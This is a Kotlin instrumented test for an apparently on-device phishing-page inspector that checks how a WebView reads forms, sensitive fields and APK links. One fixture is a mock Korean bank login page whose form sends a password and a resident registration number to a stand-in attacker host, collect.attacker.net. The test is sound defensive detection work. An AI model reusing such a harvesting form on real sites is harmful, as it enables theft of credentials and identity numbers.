package com.guadian.ondevice.pagecontent

import androidx.test.platform.app.InstrumentationRegistry
import com.guadian.ondevice.judge.ReasonCode
import com.guadian.ondevice.llm.PageObservation
import com.guadian.ondevice.verdict.Evidence
import com.guadian.ondevice.verdict.PageResult
import com.guadian.ondevice.verdict.VerdictTable
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import java.net.URLEncoder

/**
 * PageInspector needs a real WebView (local `test` unit tests run against a stub
 * android.jar that no-ops WebView), so this runs only as an instrumented test.
 * Pages are loaded from data: URLs so the test needs no network access and no
 * fixture server.
 * Run with: ./gradlew connectedDebugAndroidTest
 */
class PageInspectorTest {
    private val context = InstrumentationRegistry.getInstrumentation().targetContext

    @Test
    fun passwordFieldAloneIsLeftToTheModel() {
        val facts = observed("<html><body><form><input type=\"password\"></form></body></html>").facts

        assertTrue(facts.opened!!)
        assertFalse(facts.sensitiveField!!)
        assertFalse(VerdictTable.default.decide(facts).final)
    }

    @Test
    fun registrationNumberFieldIsHighBeforeTheModel() {
        val facts = observed("<html><body><form><input name=\"jumin\" placeholder=\"주민등록번호\"></form></body></html>").facts

        assertTrue(facts.sensitiveField!!)
        val decision = VerdictTable.default.decide(facts)
        assertEquals("HIGH", decision.risk)
        assertTrue(decision.final)
    }

    @Test
    fun rejectsDataUrlsByDefault() {
        val result = runBlocking { PageInspector(context = context).inspect("data:text/html,<p>x</p>", Evidence(VerdictTable.Facts())) }

        assertEquals(ReasonCode.PAGE_UNSUPPORTED_SCHEME, (result as PageResult.Unreadable).verdict.reason)
    }

    @Test
    fun observesPageTheWayTheCollectorDid() {
        var observation: PageObservation? = null
        observed(
            "<html><head><title> Bank  Login </title><style>.x{}</style></head><body>" +
                "<p>본인 인증이</p><p>필요합니다</p><script>var hidden = 1;</script>" +
                "<form action=\"https://collect.attacker.net/p\"><input type=\"password\" name=\"pw\">" +
                "<input name=\"jumin\" placeholder=\"주민등록번호\"></form>" +
                "<a href=\"https://files.example.net/app.apk\">download</a></body></html>",
        ) { observation = it }

        val obs = checkNotNull(observation)
        assertTrue(obs.loaded)
        assertEquals("Bank  Login", obs.title)
        // Text nodes joined with spaces and collapsed; script and style text excluded.
        assertEquals("Bank Login 본인 인증이 필요합니다 download", obs.text)
        assertEquals(listOf("password", "rrn"), obs.forms.single().asks)
        assertEquals(listOf("https://files.example.net/app.apk"), obs.apkLinks)
    }

    private fun observed(html: String, onObservation: (PageObservation) -> Unit = {}): Evidence {
        /*
         * URLEncoder is form-encoding (space -> "+"), not URI percent-encoding;
         * a literal "+" between e.g. "input" and "type=..." would corrupt the
         * tag itself, so space must become "%20" instead.
         */
        val encoded = URLEncoder.encode(html, "UTF-8").replace("+", "%20")
        val inspector = PageInspector(
            context = context,
            allowedSchemes = setOf("data"),
            onObservation = { _, obs -> onObservation(obs) },
        )
        val result = runBlocking { inspector.inspect("data:text/html;charset=utf-8,$encoded", Evidence(VerdictTable.Facts())) }
        return (result as PageResult.Observed).evidence
    }
}
